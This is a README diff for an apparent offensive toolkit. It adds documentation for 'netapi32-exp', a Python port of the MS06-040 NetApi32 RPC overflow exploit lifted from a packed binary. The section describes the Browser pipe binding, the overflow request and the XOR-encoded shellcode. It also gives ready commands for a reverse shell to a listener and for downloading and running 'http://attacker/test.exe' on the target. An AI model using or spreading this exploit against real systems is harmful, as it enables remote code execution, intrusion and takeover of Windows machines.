@@ -50,3 +50,26 @@ matches impacket's output byte-for-byte).  Read-only architectural probe.
 nsa-equation-py get-arch -target 192.168.1.5              # single host
 nsa-equation-py get-arch -targets hosts.txt -timeout 2    # one host per line
 ```
+
+### netapi32-exp — MS06-040 (NetApi32 NetpwPathCanonicalize) RPC 利用
+
+Python rewrite of the Mika MS06-040 RPC exploit recovered from
+`ms06040rpc.exe` (memory-packed; OEP 0x401000 unpacked via x32dbg + IDA Pro).
+It binds the remote **Browser RPC interface** (`4b324fc8-1670-01d3-1278-5a47bf6ee188`)
+over the `\\<host>\\pipe\\BROWSER` named pipe and fires a **NetpwPathCanonicalize**
+overflow request (opnum 0x1F), carrying an XOR-encoded shellcode:
+
+- `os_type 1` → Windows 2000 SP4  (request 1152 B, sent once)
+- `os_type 2` → Windows XP SP1   (request 796 B, sent twice)
+- **reverse-shell**   : patches LHOST/LPORT into an msfvenom-style reverse_tcp stage
+- **download-exec**   : embeds a URL and XOR-encodes a download-and-run stage
+
+The exact payload/request bytes are lifted verbatim from the unpacked image.
+Transport uses **impacket** (SMB named-pipe) to mirror the C original's
+`WNetAddConnection2A + CreateFileW("\\host\\pipe\\BROWSER")`:
+
+```bash
+pip install impacket
+nsa-equation-py netapi32-exp 192.168.1.5 -r 192.168.1.9 -p 4444 -o 1    # reverse shell
+nsa-equation-py netapi32-exp 192.168.1.5 -u http://attacker/test.exe -o 2 # download+exec
+```
